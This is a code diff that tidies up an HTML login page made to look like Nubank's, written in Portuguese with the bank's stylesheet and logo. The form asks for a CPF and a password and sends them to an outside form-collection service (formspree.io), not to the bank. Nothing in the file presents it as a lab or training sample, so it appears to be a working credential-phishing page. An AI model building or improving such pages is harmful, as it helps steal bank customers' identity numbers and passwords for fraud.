@@ -1,21 +1,29 @@
 <!DOCTYPE html>
 <html lang="pt-br">
-    <link rel="stylesheet" href="nubank.css">
 <head>
-    <img src="new-logo-white.svg">
-    </head>
-
-    <form
-  action="https://formspree.io/f/movqlqby"
-  method="POST"
->
-    <b><p>Faça Seu Login</p></b>
-    <label for="cpf">CPF<input type="cpf" name="cpf" id="cpf" ></label>
-    <label for="password">SENHA<input type="password" name="password" id="password"></label>
-    <button type="submit">Send</button>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="nubank.css">
+    <title>Login</title>
+</head>
+<body>
+    <img src="new-logo-white.svg" alt="Logo">
+    
+    <form action="https://formspree.io/f/movqlqby" method="POST">
+        <b><p>Faça Seu Login</p></b>
+        
+        <label for="cpf">CPF
+            <input type="text" name="cpf" id="cpf">
+        </label>
+        
+        <label for="password">SENHA
+            <input type="password" name="password" id="password">
+        </label>
+        
+        <button type="submit">Enviar</button>
     </form>
+
     <a href="#">Esqueci a Senha > </a>
     <a href="#">Ainda não sou cliente > </a>
-</form>
 </body>
 </html>
